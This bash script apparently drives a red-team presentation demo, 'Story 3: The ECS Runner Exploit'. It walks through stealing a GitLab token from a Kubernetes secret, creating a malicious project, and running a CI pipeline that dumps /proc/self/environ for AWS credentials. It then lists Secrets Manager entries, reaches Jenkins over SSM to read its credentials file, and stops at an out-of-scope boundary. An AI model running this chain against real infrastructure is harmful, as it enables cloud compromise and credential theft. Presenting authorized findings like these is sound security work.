#!/bin/bash
set -euo pipefail

# Story 3: ECS Runner Exploit
# Real chain: K8s SA impersonation -> GitLab API token -> malicious project
# -> ECS Fargate runner (AdministratorAccess) -> /proc/self/environ dump
# -> SecretsManager -> SSM -> Jenkins -> cross-boundary GitLab -> HARD STOP

source "$(dirname "$0")/demo_runner.sh"

PROFILE="default"
ACCOUNT_1="111111111111"

set_prompt "eks-node \$"

banner "Story 3: The ECS Runner Exploit"

# ── Step 1: K8s SA impersonation ──
step 1 "K8s SA impersonation"

narrate "From the EKS node (Story 2), we had kubectl."
narrate "Enumerated service accounts in the namespace."
echo ""

show_cmd "kubectl get serviceaccounts" "$(cat <<'SIMOUT'
  NAME                   SECRETS
  default                1
  deployer-sa            1
  gitlab-integration     1
  monitoring-sa          1
SIMOUT
)"

echo ""
narrate "gitlab-integration looks interesting."
echo ""

show_cmd "kubectl get secret gitlab-integration-token -o json | jq .data" "$(cat <<'SIMOUT'
  {
    "token": "Z2xwYXQtOGY3...base64...",
    "ca.crt": "LS0tLS1CRU...base64..."
  }
SIMOUT
)"

echo ""
alert "GitLab API token found in K8s secrets"

# ── Step 2: Proxy to internal GitLab ──
step 2 "C2 proxy to internal GitLab"

narrate "GitLab is internal only -- no public access."
narrate "Proxied through the EKS node via C2 agent."
echo ""

show_cmd "curl -sk -H 'PRIVATE-TOKEN: glpat-...' https://gitlab.internal/api/v4/projects" "$(cat <<'SIMOUT'
  [
    {"id": 142, "name": "infra-deploy"},
    {"id": 143, "name": "app-backend"},
    {"id": 144, "name": "monitoring"},
    ...47 projects total
  ]
SIMOUT
)"

echo ""
success "Authenticated to internal GitLab via proxy"
info "47 projects visible. Full API access."

# ── Step 3: Create malicious project ──
step 3 "Create malicious project via API"

narrate "Instance-wide shared runner. Any project can use it."
narrate "Created our own project with a malicious pipeline."
echo ""

show_cmd "curl -X POST .../api/v4/projects -d 'name=test-integration'" "$(cat <<'SIMOUT'
  {
    "id": 201,
    "name": "test-integration",
    "default_branch": "main",
    "shared_runners_enabled": true
  }
SIMOUT
)"

echo ""
alert "Project created. Shared runners enabled by default."

# ── Step 4: Push .gitlab-ci.yml ──
step 4 "Push the exploit pipeline"

narrate "The .gitlab-ci.yml dumps /proc/self/environ."
narrate "ECS injects AWS creds as env vars into the container."
narrate "Stored as a GitLab artifact we could download."
echo ""

echo "  .gitlab-ci.yml:"
hr
echo "  stages:"
echo "    - exploit"
echo ""
echo "  extract-credentials:"
echo "    stage: exploit"
echo "    script:"
printf "      ${C_RED}- cat /proc/self/environ | tr '\\\\0' '\\\\n'${C_RESET}\n"
printf "      ${C_RED}    | grep AWS > creds.txt${C_RESET}\n"
echo "    artifacts:"
echo "      paths: [creds.txt]"
hr

echo ""
narrate "Pipeline ran. Artifact downloaded."
echo ""

show_cmd "cat creds.txt" "$(cat <<'SIMOUT'
  AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXXXXXXXXX
  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
  AWS_SESSION_TOKEN=FwoGZXIvYXdz...truncated
  AWS_DEFAULT_REGION=us-east-2
SIMOUT
)"

echo ""
alert "Full ECS task role credentials extracted"

# ── Step 5: Verify creds -- AdministratorAccess to prod ──
step 5 "What did we get?"

set_prompt "ecs-runner \$"

if is_live; then
    type_cmd "aws sts get-caller-identity"
    aws sts get-caller-identity --profile "${PROFILE}" --region "${REGION}" --output json 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
print()
print(f'  Account:  {d[\"Account\"]}')
print(f'  Arn:      {d[\"Arn\"]}')
print()
"
else
    show_cmd "aws sts get-caller-identity" "$(cat <<SIMOUT

  Account:  ${ACCOUNT_1}
  Arn:      arn:aws:iam::${ACCOUNT_1}:role/ecs-gitlab-runner

SIMOUT
)"
fi

alert "ECS task role: AdministratorAccess to production"

# ── Step 6: SecretsManager ──
step 6 "SecretsManager -- all environment creds"

if is_live; then
    type_cmd "aws secretsmanager list-secrets"
    aws secretsmanager list-secrets --profile "${PROFILE}" --region "${REGION}" --output json --no-cli-pager 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
for s in d.get('SecretList',[])[:8]:
    name = s.get('Name','?')
    print(f'  {name}')
" 2>/dev/null || echo "  (unable to list)"
    echo ""
else
    show_cmd "aws secretsmanager list-secrets" "$(cat <<'SIMOUT'
  prod-rds-credentials
  prod-api-keys
  staging-deploy-credentials
  staging-rds-credentials
  dev-deploy-credentials
  dev-rds-credentials
  jenkins-admin-password
  gitlab-cross-boundary-token
SIMOUT
)"
fi

echo ""
alert "8 secrets. All environments. Jenkins. GitLab."
narrate "Admin access key stored in the same account."
narrate "We used it to persist."

# ── Step 7: SSM to Jenkins ──
step 7 "SSM into Jenkins"

narrate "Jenkins had network access to all environments."
narrate "And credentials to the cross-boundary GitLab."
echo ""

show_cmd "aws ssm start-session --target i-jenkins-prod" "$(cat <<'SIMOUT'
  Starting session with SessionId: red-team-...
  sh-4.2$ cat /var/lib/jenkins/credentials.xml
  ...
  <com.cloudbees.plugins.credentials>
    <id>gitlab-cross-boundary</id>
    <username>deploy-bot</username>
    <password>{AQAAABAAAAAg...encrypted...}</password>
  </com.cloudbees.plugins.credentials>
SIMOUT
)"

echo ""
alert "Jenkins creds to cross-boundary GitLab found"

# ── HARD STOP ──
echo ""
hr
printf "${C_BOLD}${C_RED}"
echo "  ============================================"
echo "    HARD STOP"
echo "    Cross-boundary system. Outside jurisdiction."
echo "    Reported finding. Did not proceed."
echo "  ============================================"
printf "${C_RESET}\n"
hr

# ── Summary ──
echo ""
echo "  Attack path:"
echo ""
echo "    K8s SA impersonation"
echo "      | stole GitLab API token from secrets"
echo "      v"
echo "    Internal GitLab (via C2 proxy)"
echo "      | created malicious project"
echo "      v"
echo "    ECS Fargate runner"
echo "      | /proc/self/environ -> artifact -> creds"
echo "      v"
echo "    AdministratorAccess (production)"
echo "      | SecretsManager: staging + dev creds"
echo "      v"
echo "    SSM -> Jenkins (all environments)"
echo "      | cross-boundary GitLab creds"
echo "      v"
echo "    HARD STOP"
echo ""
hr
info "From a K8s secret to a cross-boundary system."
info "One shared runner. One /proc/self/environ."
info "The patient enabled all of this."
